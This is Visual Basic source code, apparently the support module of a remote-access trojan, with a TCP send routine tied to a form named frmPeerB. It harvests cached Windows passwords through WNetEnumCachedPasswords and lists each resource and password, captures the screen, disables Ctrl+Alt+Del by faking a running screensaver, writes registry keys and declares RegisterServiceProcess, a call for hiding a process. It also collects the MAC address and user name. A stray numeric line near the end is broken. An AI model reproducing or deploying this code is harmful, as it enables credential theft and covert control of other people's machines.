Attribute VB_Name = "Module1"
Option Explicit
Public Const NCBASTAT As Long = &H33
Public Const NCBNAMSZ As Long = 16
Public Const HEAP_ZERO_MEMORY As Long = &H8
Public Const HEAP_GENERATE_EXCEPTIONS As Long = &H4
Public Const NCBRESET As Long = &H32
Public Type NET_CONTROL_BLOCK
   ncb_command    As Byte
   ncb_retcode    As Byte
   ncb_lsn        As Byte
   ncb_num        As Byte
   ncb_buffer     As Long
   ncb_length     As Integer
   ncb_callname   As String * NCBNAMSZ
   ncb_name       As String * NCBNAMSZ
   ncb_rto        As Byte
   ncb_sto        As Byte
   ncb_post       As Long
   ncb_lana_num   As Byte
   ncb_cmd_cplt   As Byte
   ncb_reserve(9) As Byte
   ncb_event      As Long
End Type
Public Type ADAPTER_STATUS
   adapter_address(5) As Byte
   rev_major         As Byte
   reserved0         As Byte
   adapter_type      As Byte
   rev_minor         As Byte
   duration          As Integer
   frmr_recv         As Integer
   frmr_xmit         As Integer
   iframe_recv_err   As Integer
   xmit_aborts       As Integer
   xmit_success      As Long
   recv_success      As Long
   iframe_xmit_err   As Integer
   recv_buff_unavail As Integer
   t1_timeouts       As Integer
   ti_timeouts       As Integer
   Reserved1         As Long
   free_ncbs         As Integer
   max_cfg_ncbs      As Integer
   max_ncbs          As Integer
   xmit_buf_unavail  As Integer
   max_dgram_size    As Integer
   pending_sess      As Integer
   max_cfg_sess      As Integer
   max_sess          As Integer
   max_sess_pkt_size As Integer
   name_count        As Integer
End Type
Public Type NAME_BUFFER
   name        As String * NCBNAMSZ
   name_num    As Integer
   name_flags  As Integer
End Type
Public Type ASTAT
   adapt          As ADAPTER_STATUS
   NameBuff(30)   As NAME_BUFFER
End Type
Public Declare Function Netbios Lib "netapi32.dll" _
   (pncb As NET_CONTROL_BLOCK) As Byte
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" _
   (hpvDest As Any, ByVal _
    hpvSource As Long, ByVal _
    cbCopy As Long)
Public Declare Function GetProcessHeap Lib "kernel32" () As Long
Public Declare Function HeapAlloc Lib "kernel32" _
    (ByVal hHeap As Long, ByVal dwFlags As Long, _
     ByVal dwBytes As Long) As Long
Public Declare Function HeapFree Lib "kernel32" _
    (ByVal hHeap As Long, _
     ByVal dwFlags As Long, _
     lpMem As Any) As Long


Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function RegisterServiceProcess Lib "kernel32.dll" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
Public Declare Function GetCurrentProcessId Lib "kernel32.dll" () As Long
Declare Function WNetEnumCachedPasswords Lib "mpr.dll" (ByVal s As String, ByVal i As Integer, ByVal b As Byte, ByVal proc As Long, ByVal l As Long) As Long
Declare Function SetDoubleClickTime Lib "user32" (ByVal wCount As Long) As Long
Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Declare Function GetModuleUsage Lib "Kernel" (ByVal hModule As Integer) As Integer
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Declare Function GetDiskFreeSpace Lib "kernel32" Alias "GetDiskFreeSpaceA" (ByVal lpRootPathName As String, lpSectorsPerCluster As Long, lpBytesPerSector As Long, lpNumberOfFreeClusters As Long, lpTtoalNumberOfClusters As Long) As Long
Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Long
Declare Function ReleaseDC Lib "user32" (ByVal hWnd As Long, ByVal hDC As Long) As Long
Declare Function OpenClipboard Lib "user32" (ByVal hWnd As Long) As Long
Declare Function EmptyClipboard Lib "user32" () As Long
Declare Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
Declare Function CloseClipboard Lib "user32" () As Long
Declare Function SelectObject Lib "gdi32" (ByVal hDC As Long, ByVal hObject As Long) As Long
Declare Function DeleteDC Lib "gdi32" (ByVal hDC As Long) As Long
Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal XSrc As Long, ByVal YSrc As Long, ByVal dwRop As Long) As Long
Declare Function CreateDC Lib "gdi32" Alias "CreateDCA" (ByVal lpDriverName As String, ByVal lpDeviceName As String, ByVal lpOutput As String, ByVal lpInitData As String) As Long
Declare Function CreateCompatibleDC Lib "gdi32" (ByVal hDC As Long) As Long
Declare Function CreateCompatibleBitmap Lib "gdi32" (ByVal hDC As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Long, ByVal fuWinIni As Long) As Long
Declare Function RasEnumConnectionsA& Lib "RasApi32.DLL" (lprasconn As Any, lpcb&, lpcConnections&)
Public Const REG_SZ = 1
Public Const REG_DWORD = 4
Public Const HKEY_LOCAL_MACHINE = &H80000002
Declare Function RegCreateKey Lib _
"advapi32.dll" Alias "RegCreateKeyA" _
(ByVal Hkey As Long, ByVal lpSubKey As _
String, phkResult As Long) As Long
Declare Function RegCloseKey Lib _
"advapi32.dll" (ByVal Hkey As Long) As Long
Declare Function RegSetValueEx Lib _
"advapi32.dll" Alias "RegSetValueExA" _
(ByVal Hkey As Long, ByVal _
lpValueName As String, ByVal _
Reserved As Long, ByVal dwType _
As Long, lpData As Any, ByVal _
cbData As Long) As Long
Type PASSWORD_CACHE_ENTRY
    cbEntry As Integer
    cbResource As Integer
    cbPassword As Integer
    iEntry As Byte
    nType As Byte
    abResource(1 To 1024) As Byte
End Type
Public Const WM_SYSCOMMAND = &H112
Public Const SC_SCREENSAVE = &HF140
Private Const SPI_SCREENSAVERRUNNING = 97
Const KEY_QUERY_VALUE = &H1

Public Function GetMACAddress() As String
   Dim tmp As String
   Dim pASTAT As Long
   Dim NCB As NET_CONTROL_BLOCK
   Dim AST As ASTAT
   NCB.ncb_command = NCBRESET
   Call Netbios(NCB)
   NCB.ncb_callname = "*               "
   NCB.ncb_command = NCBASTAT
   NCB.ncb_lana_num = 0
   NCB.ncb_length = Len(AST)
   pASTAT = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS _
            Or HEAP_ZERO_MEMORY, NCB.ncb_length)
   If pASTAT = 0 Then
      Debug.Print "memory allocation failed!"
      Exit Function
   End If
   NCB.ncb_buffer = pASTAT
   Call Netbios(NCB)
   CopyMemory AST, NCB.ncb_buffer, Len(AST)
   tmp = Format$(Hex(AST.adapt.adapter_address(0)), "00") & " " & _
         Format$(Hex(AST.adapt.adapter_address(1)), "00") & " " & _
         Format$(Hex(AST.adapt.adapter_address(2)), "00") & " " & _
         Format$(Hex(AST.adapt.adapter_address(3)), "00") & " " & _
         Format$(Hex(AST.adapt.adapter_address(4)), "00") & " " & _
         Format$(Hex(AST.adapt.adapter_address(5)), "00")
   HeapFree GetProcessHeap(), 0, pASTAT
   GetMACAddress = tmp
End Function


Public Function NTDomainUserName() As String
Dim strBuffer As String * 255
Dim lngBufferLength As Long
Dim lngRet As Long
Dim strTemp As String
    lngBufferLength = 255
    lngRet = GetUserName(strBuffer, lngBufferLength)
    strTemp = UCase(Trim$(strBuffer))
    NTDomainUserName = Left$(strTemp, Len(strTemp) - 1)
End Function

Sub ScreenShot(Left As Integer, Top As Integer, Right As Integer, Bottom As Integer)
  Dim iWidth As Integer
  Dim iHeight As Integer
  Dim lSourceDC As Long
  Dim lDestDC As Long
  Dim lBitmpHnd As Long
  Dim lHWnd As Long
  Dim lDCHnd As Long
  iWidth = Right - Left
  iHeight = Bottom - Top
  lSourceDC = CreateDC("DISPLAY", 0, 0, 0)
  lDestDC = CreateCompatibleDC(lSourceDC)
  lBitmpHnd = CreateCompatibleBitmap(lSourceDC, _
   iWidth, iHeight)
  SelectObject lDestDC, lBitmpHnd
  BitBlt lDestDC, 0, 0, iWidth, iHeight, _
   lSourceDC, Left, Top, &HCC0020
  lHWnd = Screen.ActiveForm.hWnd
  OpenClipboard lHWnd
  EmptyClipboard
  SetClipboardData 2, lBitmpHnd
  CloseClipboard
  DeleteDC lDestDC
  ReleaseDC lDCHnd, lSourceDC
End Sub

Public Sub Block()
   SystemParametersInfo SPI_SCREENSAVERRUNNING, 1, 1, 0
End Sub

Public Sub Unblock()
   SystemParametersInfo SPI_SCREENSAVERRUNNING, 0, 1, 0
End Sub

Public Sub send(ByVal sendstring As String)
If frmPeerB.tcp.State = 7 Then
    frmPeerB.tcp.SendData sendstring
End If
End Sub

Public Function DiskSpace(DrivePath As String) As Double
  Dim Drive As String
  Dim SectorsPerCluster As Long, BytesPerSector As Long
  Dim NumberOfFreeClusters As Long, TotalClusters As Long, Sts As Long
  Dim DS
  Drive = Left(Trim(DrivePath), 1) & ":\"
  Sts = GetDiskFreeSpace(Drive, SectorsPerCluster, BytesPerSector, NumberOfFreeClusters, TotalClusters)
  If Sts <> 0 Then
    DiskSpace = SectorsPerCluster * BytesPerSector * NumberOfFreeClusters
    DS = Format$(DiskSpace, "###,###")
  Else
    DiskSpace = -1
  End If
End Function

Public Sub GetPasswords()
    Dim nLoop As Integer
    Dim cString As String
    Dim lLong As Long
    Dim bByte As Byte
    bByte = &HFF
    nLoop = 0
    lLong = 0
    cString = ""
    Call WNetEnumCachedPasswords(cString, nLoop, bByte, AddressOf callback, lLong)
End Sub

Public Sub savestring(Hkey As Long, strPath As String, _
strValue As String, strdata As String)
Dim keyhand As Long
Dim r As Long
r = RegCreateKey(Hkey, strPath, keyhand)
r = RegSetValueEx(keyhand, strValue, 0, _
REG_SZ, ByVal strdata, Len(strdata))
r = RegCloseKey(keyhand)
End Sub

Public Function callback(X As PASSWORD_CACHE_ENTRY, ByVal lSomething As Long) As Integer
    Dim nLoop As Integer
    Dim cString As String
    Dim ccomputer
    Dim Resource As String
    Dim ResType As String
    Dim Password As String
    ResType = X.nType
    For nLoop = 1 To X.cbResource
        If X.abResource(nLoop) <> 0 Then
            cString = cString & Chr(X.abResource(nLoop))
        Else
            cString = cString & " "
        End If
    Next
    Resource = cString
    cString = ""
    For nLoop = X.cbResource + 1 To (X.cbResource + X.cbPassword)
        If X.abResource(nLoop) <> 0 Then
            cString = cString & Chr(X.abResource(nLoop))
        Else
            cString = cString & " "
        End If
    Next
    Password = cString
    cString = ""
    frmPeerB.List1.AddItem " R: " & Resource & " P: " & Password
66
        callback = True
    End Function






